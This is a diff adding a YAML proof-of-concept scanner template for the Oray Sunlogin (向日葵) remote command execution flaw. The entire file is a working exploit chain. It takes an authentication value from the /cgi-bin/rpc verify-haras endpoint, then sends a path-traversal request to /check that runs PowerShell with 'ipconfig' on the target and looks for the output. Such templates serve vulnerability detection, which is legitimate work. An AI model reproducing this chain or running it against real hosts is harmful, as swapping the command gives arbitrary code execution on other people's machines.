@@ -1,0 +1,24 @@
+id: poc-yaml-oray-sunlogin-rpc-rce
+info:
+  name: 向日葵 check 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: sunflower
+requests:
+- method: GET
+  path: /cgi-bin/rpc?action=verify-haras
+  expression: 'status_code == 200 && contains(body, "\"verify_string\"")
+
+    '
+  output:
+  - regex_match(body, "\"verify_string\":\"(?P<cid>.+?)\"")
+- method: GET
+  path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
+  headers:
+    Cookie: CID={{.cid}}
+  expression: 'status_code == 200 && contains(body, "Windows IP")
+
+    '
+variables: {}
+transport: http
